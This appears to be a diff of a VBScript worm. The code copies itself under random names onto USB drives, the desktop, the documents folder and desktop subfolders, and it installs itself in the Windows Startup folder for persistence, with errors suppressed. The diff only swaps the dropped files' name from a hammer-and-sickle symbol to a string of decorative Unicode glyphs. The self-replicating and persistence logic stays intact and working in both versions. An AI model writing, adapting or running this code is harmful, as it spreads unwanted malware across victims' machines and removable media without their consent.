@@ -32,7 +32,7 @@ If usbDrivePath <> "" Then
     For i = 1 To numCopies
         randomIteration = Int((1000 * Rnd) + 1)
 
-        strCopyPath = usbDrivePath & "\☭" & randomIteration & ".vbs"
+        strCopyPath = usbDrivePath & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
         objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
     Next
     On Error GoTo 0 ' Reset error handling
@@ -44,11 +44,11 @@ For i = 1 To numCopies
     randomIteration = Int((1000 * Rnd) + 1)
 
     ' Create a copy of the script on the desktop
-    strDesktopCopyPath = strDesktopFolder & "\☭" & randomIteration & ".vbs"
+    strDesktopCopyPath = strDesktopFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
 
     ' Create a copy of the script in the documents folder
-    strDocumentsCopyPath = strDocumentsFolder & "\☭" & randomIteration & ".vbs"
+    strDocumentsCopyPath = strDocumentsFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
 Next
 On Error GoTo 0 ' Reset error handling
@@ -56,7 +56,7 @@ On Error GoTo 0 ' Reset error handling
 ' Add the script to the startup folder
 On Error Resume Next ' Ignore errors
 startupFolder = objShell.SpecialFolders("Startup")
-objFSO.CopyFile strScriptPath, startupFolder & "\☭.vbs", True ' Add "True" to overwrite existing files
+objFSO.CopyFile strScriptPath, startupFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎.vbs", True ' Add "True" to overwrite existing files
 On Error GoTo 0 ' Reset error handling
 
 ' Loop indefinitely
@@ -91,7 +91,7 @@ For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
     On Error Resume Next ' Ignore errors
     For i = 1 To numCopies
         randomIteration = Int((1000 * Rnd) + 1)
-        strCopyPath = objFolder.Path & "\☭" & randomIteration & ".vbs"
+        strCopyPath = objFolder.Path & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
         objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
     Next
     On Error GoTo 0 ' Reset error handling
